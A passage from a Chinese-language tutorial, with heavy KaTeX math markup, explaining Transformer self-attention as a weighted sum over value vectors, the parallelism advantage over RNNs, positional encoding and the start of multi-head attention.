<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> 矩阵的每一行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> 都是一个概率分布，它精确地刻画了在生成输出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，模型应该将多少“注意力”分配给输入序列中的每一个位置 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>。</p>
<p>最后，我们将这个注意力权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> 与值矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 相乘，即可得到输出矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Y</mi><mo>=</mo><mi>S</mi><mo>⋅</mo><mi>V</mi><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y = S \cdot V \space\space\space (seq\_len,out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span></div>
<p>这一步的本质是加权求和。<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> 的每一行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 都是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 中所有行的加权组合，权重由 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> 决定。因此，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 不再是孤立的信息，而是融合了整个序列相关信息的“语境化”表示。</p>
<p>我们将以上的计算过程，就是通过输入<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，最后计算得到<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>的流程用如下图表示：（下图中的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>就是我们文中的输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>，后文中均用<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>表示输出）</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d932f9130cde49e5a5f3eb2e21812d98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=GXmi1S4t0DRtJB65lh%2FaIgaOwyY%3D" alt="c10.jpg" loading="lazy"/></p>
<p>以上，就是“自注意力”的计算过程，我们可以将其封装为一个“自注意力(Self Attention)”模块，就如同上图所示。</p>
<p>至此，我们仅用几行清晰的矩阵运算，就完成了将输入序列 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 转换为上下文感知的输出序列 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> 的全部过程。非常的优雅、高效。</p>
<p>另外，这种方式相比传统的循环神经网络（LSTM，GRU等），效率提升了许多，为什么？RNN的核心是其循环结构。为了处理序列中的第 <code>t</code> 个元素，它必须等待第 <code>t-1</code> 个元素的隐状态计算完成。这种严格的<strong>时序依赖关系</strong>就像一条单行生产线，工序必须一个接一个进行。在训练时，这被称为“串行依赖”，意味着模型无法同时处理一个批次中所有序列位置的计算。这就意味着即使拥有强大的GPU，计算也必须按时间步展开，无法充分利用GPU成千上万个核心的并行能力。</p>
<p>而Transformer通过注意力机制，<strong>将序列中所有元素之间的关联计算，一次性表述为矩阵乘法</strong>。对于GPU来说，这是它最擅长处理的<strong>稠密矩阵运算</strong>，可以调用海量计算核心同时完成数以百万计的点积运算。而计算位置 <code>i</code> 与位置 <code>j</code> 的注意力权重，<strong>不再依赖于</strong>位置 <code>i-1</code> 或 <code>j-1</code> 的任何中间结果。这种设计彻底打破了时序枷锁。</p>
<hr/>
<p>相信认真读到这里的你，心中可能会浮现一个重要的疑问：<strong>序列数据中至关重要的时序信息去哪儿了？</strong> Transformer的“自注意力”机制似乎只专注于计算词与词之间的关联强度，却<strong>完全忽略了它们在序列中的相对位置或绝对距离</strong>。</p>
<p>举个例子，考虑以下两个句子：</p>
<ul>
<li>“<strong>我</strong>爱<strong>你</strong>”</li>
<li>“<strong>你</strong>爱<strong>我</strong>”</li>
</ul>
<p>这两个句子包含完全相同的词语。如果只依赖自注意力机制，模型为“爱”这个词计算出的上下文表示，在两个句子中可能会非常相似，因为它在两个句子里都与“我”和“你”发生了关联。然而，任何一个懂中文的人都知道，<strong>词语的顺序彻底改变了句子的含义</strong>。自注意力机制在计算时，并没有内置任何关于“我”在“你”之前还是之后的概念，它丢失了语言中这种根本性的<strong>时序结构</strong>。</p>
<p>**这是一个非常关键的洞察！**这是原始自注意力机制的一个核心局限：它本质上是一种置换不变操作。无论输入的词序如何打乱，只要词向量集合不变，自注意力计算出的输出集合在理论上就是不变的。这对于理解语言、代码、音乐等任何依赖顺序的结构来说是致命的缺陷。</p>
<p>不过，这个看似严重的缺陷早已被Transformer的设计者预见并优雅地解决了。解决方案就是在将词嵌入向量输入Transformer层之前，为它们注入<strong>位置信息</strong>，这个关键的模块称为<strong>位置编码（Positional Encoding）</strong>。具体做法是<strong>生成一个与词嵌入向量维度相同长度也相同的“位置向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>”，并将其与词嵌入向量相加</strong>。这个位置向量不是随机的，它必须能够唯一且有效地表征每个词在序列中的绝对位置（甚至相对位置）,如此一来，输入模型的就不再是单纯的词义向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，而是<strong>词义与位置信息的融合体</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i + p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。自注意力机制在此基础上计算关联时，就会自然而然地同时考虑“你是什么词”以及“你出现在哪里”这两重信息。</p>
<p>关于“位置编码”的深入剖析，我将其安排在了文末的附录章节，以便于主线阐述的连贯性，感兴趣的读者可随时参考。</p>
<hr/>
<p>至此，你已经掌握了Transformer最核心的动力单元——<strong>自注意力（Self-Attention）</strong>。它赋予了序列中每个元素“纵观全局”的能力。然而，一个真正强大的系统，绝不应满足于单一的观察视角。</p>
<p>如果只用一个自注意力机制，就好比只用一套固定的滤镜观察世界，它可能擅长捕捉某种模式，但会忽略其他同样重要的模式。</p>
<p>于是，<strong>多头注意力（Multi-Head Attention）</strong> 应运而生。它的设计哲学非常直观：<strong>与其让一个注意力机制勉力捕捉所有类型的关系，不如并行部署多个独立的注意力“头”，让每个头自由地、专业化地学习并关注序列中不同方面的依赖模式</strong>。</p>
<p>举个例子：将多头注意力想象成一个高级别的专家委员会。面对一份复杂的文件（输入序列），委员会主席（模型）不会只询问一位专家。相反，他会同时召集：</p>
<ul>
<li>一位法律专家（头1），审视条款间的逻辑与合规性；</li>
<li>一位财务专家（头2），分析数据间的勾稽关系；</li>
<li>一位技术专家（头3），评估方案实施的可行性。</li>
</ul>
<p>每位专家独立撰写自己的分析报告（每个头的输出）。最后，主席将所有报告汇总（拼接），并综合形成一份最终的决策文件。这种方式远比依赖单一专家的判断更为全面和稳健。</p>
<p>多头注意力的功能和“自注意力（self-Attention）”模块是一样的，本质依然是将一个序列转化为另一个序列。</p>
<p>既然是多头注意力，其实我们就可以想到了，就是多堆叠几个Self-Attention层就行了，有几个头，就有几个Self-Attention层。</p>
<p>假设我们有一个形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> 的输入矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>。现在，我们不再只使用一个自注意力层，而是准备 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span></span></span></span></span> 个（例如 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">h=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">4</span></span></span></span></span>）<strong>独立的</strong>自注意力层。每个层都有自己独有的、互不共享的三组权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>W</mi><mi>k</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>W</mi><mi>v</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">{W_q^{(i)}, W_k^{(i)}, W_v^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3461em;vertical-align:-0.3013em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2527em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.3987em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span></span></span>，其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">i=1,2,...,h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">h</span></span></span></span></span>。</p>
<p>我们将同一个输入 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 并行地送入这 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span></span></span></span></span> 个自注意力层中，每个头都会输出一个形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> 的矩阵。接下来，我们将这些输出矩阵进行合并（也可以叫拼接）成一个新矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Z_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。<span class="math math-inline"><span class="katex"><span 